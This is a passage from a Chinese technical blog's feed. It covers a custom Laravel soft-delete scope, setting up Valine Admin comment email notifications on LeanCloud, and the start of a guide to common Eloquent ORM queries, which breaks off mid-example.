class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;save();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;fireModelEvent(<span class="string">'restored'</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if the model instance has been soft-deleted.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">trashed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ! (<span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;getDeletedAtColumn()&#125; === <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过定义<code>is_deleted</code> 字段来标示是否删除，默认值<code>0. 未删除</code>，<code>1. 已删除</code>，同时给该字段添加普通索引。</p><p>接着还需要重写<code>SoftDeletingScope.php</code> 类，约束默认查询<code>is_deleted = 0</code> 的记录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Traits</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Builder</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">SoftDeletingScope</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoftDeletingScopeEx</span> <span class="keyword">extends</span> <span class="title">SoftDeletingScope</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将约束加到 Eloquent 查询构造中，这样默认查询的就是 `is_deleted` = 0 的记录了</span></span><br><span class="line"><span class="comment">     * Apply the scope to a given Eloquent query builder.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Database\Eloquent\Builder $builder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Database\Eloquent\Model $model</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">apply</span><span class="params">(Builder $builder, Model $model)</span> </span>&#123;</span><br><span class="line">        $builder-&gt;where($model-&gt;getQualifiedDeletedAtColumn(), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Extend the query builder with the needed functions.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Database\Eloquent\Builder $builder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">extend</span><span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;extensions <span class="keyword">as</span> $extension) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="string">"add&#123;$extension&#125;"</span>&#125;($builder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $builder-&gt;onDelete(<span class="function"><span class="keyword">function</span> <span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">            $column = <span class="keyword">$this</span>-&gt;getDeletedAtColumn($builder);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $builder-&gt;update([</span><br><span class="line">                $column =&gt; \DB::Raw(<span class="string">'UNIX_TIMESTAMP(NOW())'</span>)</span><br><span class="line">            ]);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add the restore extension to the builder.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Database\Eloquent\Builder $builder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addRestore</span><span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">        $builder-&gt;macro(<span class="string">'restore'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">            $builder-&gt;withTrashed();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $builder-&gt;update([</span><br><span class="line">                $builder-&gt;getModel()</span><br><span class="line">                    -&gt;getDeletedAtColumn() =&gt; <span class="number">0</span></span><br><span class="line">            ]);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add the without-trashed extension to the builder.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Database\Eloquent\Builder $builder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addWithoutTrashed</span><span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">        $builder-&gt;macro(<span class="string">'withoutTrashed'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">            $model = $builder-&gt;getModel();</span><br><span class="line"></span><br><span class="line">            $builder-&gt;withoutGlobalScope(<span class="keyword">$this</span>)</span><br><span class="line">                -&gt;where($model-&gt;getQualifiedDeletedAtColumn(), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $builder;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add the only-trashed extension to the builder.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Database\Eloquent\Builder $builder</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addOnlyTrashed</span><span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">        $builder-&gt;macro(<span class="string">'onlyTrashed'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">            $model = $builder-&gt;getModel();</span><br><span class="line"></span><br><span class="line">            $builder-&gt;withoutGlobalScope(<span class="keyword">$this</span>)</span><br><span class="line">                -&gt;where($model-&gt;getQualifiedDeletedAtColumn(), <span class="string">'&lt;&gt;'</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $builder;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后应用到Model 中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Traits</span>\<span class="title">SoftDeletesEx</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">SoftDeletesEx</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> $table = <span class="string">'user'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> $dates = [<span class="string">"is_deleted"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/loophome/article/details/81978010" target="_blank" rel="noopener">laravel框架自定义软删除</a></li><li><a href="http://blog.dreamlikes.cn/archives/892" target="_blank" rel="noopener">Laravel5软删除（SoftDeletes）的deleted_at改造</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;通常对于数据库中比较重要的数据，不会直接删除，而是采用软删除。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>Valine 如何开启评论邮件通知</title>
    <link href="https://www.0x2beace.com/how-does-valine-turn-on-comment-email-notifications/"/>
    <id>https://www.0x2beace.com/how-does-valine-turn-on-comment-email-notifications/</id>
    <published>2021-04-05T12:22:51.000Z</published>
    <updated>2021-04-05T12:23:45.789Z</updated>
    
    <content type="html"><![CDATA[<p>事情是这样的，昨天无意在博客上看到一条留言，留言时间是两天之前，我才意识到目前的评论系统缺少通知 =_=!。</p><a id="more"></a><p>没有通知这怎么能行呢？因为我用的是一款叫做<a href="https://valine.js.org/" target="_blank" rel="noopener">Valine</a> 的评论系统，马上Google 了一下，于是有了这篇笔记。</p><p>所以这篇笔记的内容，可能不适用其他评论系统。</p><hr><p><code>Valine Admin</code> 是 Valine 评论系统的后端功能补充和增强，主要实现评论邮件通知、评论管理、垃圾评论过滤等功能。支持完全自定义的邮件通知模板，基于Akismet API实现准确的垃圾评论过滤。</p><p>在正式开始之前，首先得注册一个<a href="https://leancloud.cn/" target="_blank" rel="noopener">LeanCloud</a> 账号。</p><blockquote><p>LeanCloud 是什么？</p></blockquote><p>它是一站式后端云服务提供商，到时候我们的评论系统就是要部署在这个云服务上。</p><h2 id="创建云引擎"><a href="#创建云引擎" class="headerlink" title="创建云引擎"></a>创建云引擎</h2><p>注册成功之后，进入控制台，新建一个应用：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404104053.png" alt=""></p><p>选择开发板就好。</p><p>然后进入刚创建好的应用，依次点击设置=&gt; 应用Key，可以看到<code>AppID</code> 和<code>AppKey</code>，这两个东西很重要，</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404104646.png" alt=""></p><p>打开博客主题的配置文件，在对应的位置分别填上<code>appId</code>和<code>appKey</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404105011.png" alt=""></p><p>下一步需要绑定域名，这里需要绑定的域名，就是你的博客的域名，国内版可能有多个域名绑定供选，这里选择云引擎就好。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404105507.png" alt=""></p><p>到时候这个域名就是进入我们的评论系统的入口。</p><p>需要先完成CNAME 域名解析，绑定才会生效。</p><p>进入你的域名管理后台，添加一条<code>CNAME</code> 记录，主机名称就是刚才绑定的子域名。</p><p>域名解析没那么快，等待的时间可以开始配置云引擎。</p><p>进入云引擎=&gt;设置，添加云引擎环境变量：</p><table><thead><tr><th>变量</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td>SITE_NAME</td><td>Boo’s Blog</td><td>[必填]博客名称</td></tr><tr><td>SITE_URL</td><td><a href="https://0x2beace.com" target="_blank" rel="noopener">https://0x2beace.com</a></td><td>[必填]首页地址</td></tr><tr><td>SMTP_SERVICE</td><td>QQ</td><td>[新版支持]邮件服务提供商，支持 QQ、163、126、Gmail 以及 更多</td></tr><tr><td>SMTP_USER</td><td><a href="mailto:xxxxxx@qq.com">xxxxxx@qq.com</a></td><td>[必填]SMTP登录用户</td></tr><tr><td>SMTP_PASS</td><td>ccxxxxxxxxch</td><td>[必填]SMTP登录密码</td></tr><tr><td>SENDER_NAME</td><td>Boo</td><td>[必填]发件人</td></tr><tr><td>SENDER_EMAIL</td><td><a href="mailto:xxxxxx@qq.com">xxxxxx@qq.com</a></td><td>[必填]发件邮箱</td></tr><tr><td>ADMIN_URL</td><td><a href="https://xxx.0x2beace.com/" target="_blank" rel="noopener">https://xxx.0x2beace.com/</a></td><td>[建议]Web主机二级域名（云引擎域名），用于自动唤醒</td></tr><tr><td>BLOGGER_EMAIL</td><td><a href="mailto:xxxxx@gmail.com">xxxxx@gmail.com</a></td><td>[可选]博主通知收件地址，默认使用SENDER_EMAIL</td></tr><tr><td>AKISMET_KEY</td><td>xxxxxxxx</td><td>[可选]Akismet Key 用于垃圾评论检测，设为MANUAL_REVIEW开启人工审核，留空不使用反垃圾</td></tr></tbody></table><p>点击保存之后，切换到云引擎=&gt;部署，部署模式选择部署项目-Git部署，分支master，手动部署目标环境为生产环境，Git 仓库填入：<code>https://github.com/DesertsP/Valine-Admin.git</code>，点击部署即可。</p><h2 id="评论管理"><a href="#评论管理" class="headerlink" title="评论管理"></a>评论管理</h2><h3 id="注册管理员"><a href="#注册管理员" class="headerlink" title="注册管理员"></a>注册管理员</h3><p>如果这时域名解析已经完成，那么访问：<code>https://云引擎域名/</code>，应该可以看到如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404111837.png" alt=""></p><p>这是还没有管理员账号，需要先通过<code>https://云引擎域名/sign-up/</code>注册一个。</p><p>至此就已经可以管理我们的评论了，但是目前还没有邮件通知。</p><h2 id="设置定时任务"><a href="#设置定时任务" class="headerlink" title="设置定时任务"></a>设置定时任务</h2><p>这里设置定时任务的目的就是，每天定时检查是否存在漏发的邮件。</p><p>进入云引擎=&gt; 定时任务，创建两个定时任务：</p><ol><li>选择self-wake云函数，Cron表达式为<code>0 */30 0-16 * * ?</code>，表示每天早0点到晚16点每隔30分钟访问云引擎。</li><li>选择resend-mails云函数，Cron表达式为<code>0 0 0 * * ?</code>，表示每天0点检查过去24小时内漏发的通知邮件并补发。</li></ol><h2 id="邮件通知模版-可选配置"><a href="#邮件通知模版-可选配置" class="headerlink" title="邮件通知模版(可选配置)"></a>邮件通知模版(可选配置)</h2><p>邮件通知模板在云引擎环境变量中设定，可自定义通知邮件标题及内容模板。</p><table><thead><tr><th>环境变量</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td>MAIL_SUBJECT</td><td><code>${PARENT_NICK}</code>，您在${SITE_NAME}上的评论收到了回复</td><td>[可选]@通知邮件主题（标题）模板</td></tr><tr><td>MAIL_TEMPLATE</td><td>见下文</td><td>[可选]@通知邮件内容模板</td></tr><tr><td>MAIL_SUBJECT_ADMIN</td><td>${SITE_NAME}上有新评论了</td><td>[可选]博主邮件通知主题模板</td></tr><tr><td>MAIL_TEMPLATE_ADMIN</td><td>见下文</td><td>[可选]博主邮件通知内容模板</td></tr></tbody></table><p>邮件通知包含两种，分别是被@通知和博主通知，这两种模板都可以完全自定义。默认使用经典的蓝色风格模板（样式来源未知）。</p><p>默认被@通知邮件内容模板如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;您在&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;            $&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;上的评论有了新的回复&lt;&#x2F;h2&gt; $&#123;PARENT_NICK&#125; 同学，您曾发表评论：&lt;div style&#x3D;&quot;padding:0 12px 0 12px;margin-top:18px&quot;&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt;            $&#123;PARENT_COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;&#x2F;strong&gt;回复说：&lt;&#x2F;p&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;您可以点击&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;POST_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;查看回复的完整內容&lt;&#x2F;a&gt;，欢迎再次光临&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;。&lt;br&gt;&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>默认博主通知邮件内容模板如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;您在&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;上的文章有了新的评论&lt;&#x2F;h2&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;&#x2F;strong&gt;回复说：&lt;&#x2F;p&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;&#x2F;div&gt;&lt;p&gt;您可以点击&lt;a style&#x3D;&quot;text-decoration:none; color:#12addb&quot; href&#x3D;&quot;$&#123;POST_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;查看回复的完整內容&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>这里有个问题就是部分变量不再可用，如果使用了未定义的变量，发送邮件时会抛出异常：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404113532.png" alt=""></p><p>我选择去掉了部分变量，这就导致了邮件部分内容是缺失的：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210404113944.png" alt=""></p><p>这里没继续往下深究了，能用就行，至此就完成了所有配置。如果你遇到一些奇怪的问题，可以看看以下建议对你是否有用：</p><blockquote><p>常见问题</p></blockquote><ol><li>LeanCloud 分国内版和国际版，如果你和我一样不喜欢域名备案，使用的是国际域名服务商提供的域名，那么注册LeanCloud 时，请选选择国际版。</li><li>域名解析如果长时间未生效，请检查添加<code>CNAME</code> 纪录，<code>ttl</code> 不要选择一小时，选择六百秒。</li><li><code>SMTP_PASS</code> 不是QQ 邮箱的密码，而是<code>SMTP服务</code>的密钥，如果不知道如何获取，可以看<a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=331" target="_blank" rel="noopener">这里</a>。</li><li>修改完变量，需要重启应用，否者不会生效。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/DesertsP/Valine-Admin" target="_blank" rel="noopener">Valine Admin</a></li><li><a href="https://deserts.io/valine-admin-document/" target="_blank" rel="noopener">Valine Admin 配置手册</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;事情是这样的，昨天无意在博客上看到一条留言，留言时间是两天之前，我才意识到目前的评论系统缺少通知 =_=!。&lt;/p&gt;</summary>
    
    
    
    <category term="Hexo" scheme="https://www.0x2beace.com/categories/Hexo/"/>
    
    
    <category term="Hexo" scheme="https://www.0x2beace.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Laravel Eloquent ORM 常用操作整理</title>
    <link href="https://www.0x2beace.com/laravel-eloquent-orm-common-operations-finishing/"/>
    <id>https://www.0x2beace.com/laravel-eloquent-orm-common-operations-finishing/</id>
    <published>2021-04-04T01:22:30.000Z</published>
    <updated>2021-06-16T13:54:34.510Z</updated>
    
    <content type="html"><![CDATA[<p>Laravel 支持原生的 SQL 查询、流畅的查询构造器 和 Eloquent ORM 三种查询方式：</p><a id="more"></a><ul><li>流畅的查询构造器（简称DB），它是为创建和运行数据库查询提供的一个接口，支持大部分数据库操作，和手写SQL 的本质是一样的。</li><li>Eloquent ORM（简称ORM），是一个对象关系映射(Object Relational Mapper)工具，通过建立模型与数据表进行交互，它会把数据库中的数据映射成对象和集合对象，无需接触底层数据，可以直接调用映射出来的对象进行开发。</li></ul><p>这篇笔记主要来整理下常用的ORM 操作。</p><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><p><code>artisan tinker</code> 是 Laravel 框架自带的命令，用以调出 Laravel 的交互式运行时，Eloquent ORM 的代码可以直接在该环境中运行。</p><h3 id="查询列表"><a href="#查询列表" class="headerlink" title="查询列表"></a>查询列表</h3><p>获取所有数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">User</span>;</span><br><span class="line">$users = User::all();</span><br></pre></td></tr></table></figure><p>如果只需要部分字段，有两种方式进行限定：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$users = User::all([<span class="string">"id"</span>, <span class="string">"name"</span>]);</span><br><span class="line"></span><br><span class="line">$users = User::select(<span class="string">"id"</span>, <span class="string">"name"</span>)-&gt;get();</span><br></pre></td></tr></table></figure><p>获取单列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name = User::pluck(<span class="string">'name'</span>);</span><br><span class="line"><span class="comment">// ["boo", "mac", "yumi"]</span></span><br></pre></td></tr></table></figure><p>还可以在返回的集合中指定字段的自定义键名，注意：该自定义键必须是该表的其它字段列名，否则会报错：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name = User::pluck(<span class="string">'email'</span>,<span class="string">'name'</span>);</span><br><span class="line"><span class="comment">// ["boo" =&gt; "boo@example.com", "yumi" =&gt; "yumi@example.com"]</span></span><br></pre></td></tr></table></figure><h3 id="查询单条数据"><a href="#查询单条数据" class="headerlink" title="查询单条数据"></a>查询单条数据</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过主键获取模型</span></span><br><span class="line">$user = User:;find(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取匹配查询条件的第一个模型</span></span><br><span class="line">$user = User::where(<span class="string">'is_enable'</span>, <span class="number">1</span>)-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第一条数据的指定列值</span></span><br><span class="line">$user = User::value(<span class="string">"name"</span>);  </span><br><span class="line"><span class="comment">// 返回结果是字符串：boo</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 传递主键数组来调用 find 方法，返回匹配记录集合</span></span><br><span class="line">$user = User::find([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);  </span><br><span class="line"><span class="comment">// 等同于 </span></span><br><span class="line">$user = User::whereIn(<span class="string">"id"</span>, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])-&gt;get();</span><br></pre></td></tr></table></figure><h3 id="处理返回结果集"><a href="#处理返回结果集" class="headerlink" title="处理返回结果集"></a>处理返回结果集</h3><p>Eloquent ORM 查询返回值是 <code>Illuminate\Database\EloquentCollection</code> 的一个实例，所以除了可以使用传统的数组方式进行遍历，还可以使用集合方式进行遍历。</p><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h4><p><code>chunk</code>方法可以把大的结果集分成小块查询，例如，我们可以将全部User 表数据切割成一次处理 <code>5</code> 条记录的一小块：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$result = User::chunk(<span class="number">5</span>, <span class="function"><span class="keyword">function</span> <span class="params">($users)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($users <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $user-&gt;name.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// result 为 boolean</span></span><br></pre></td></tr></table></figure><p>在User表中一共有<code>14</code>条数据，通过查看查询日志，可以看到<code>chunk</code> 分了三次查询 ：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210403172906.png" alt=""></p><h4 id="each"><a href="#each" class="headerlink" title="each"></a>each</h4><p>如果想对一个集合中的每一项都进行一些操作，但不修改集合本身，则可以使用<code>each</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$users = 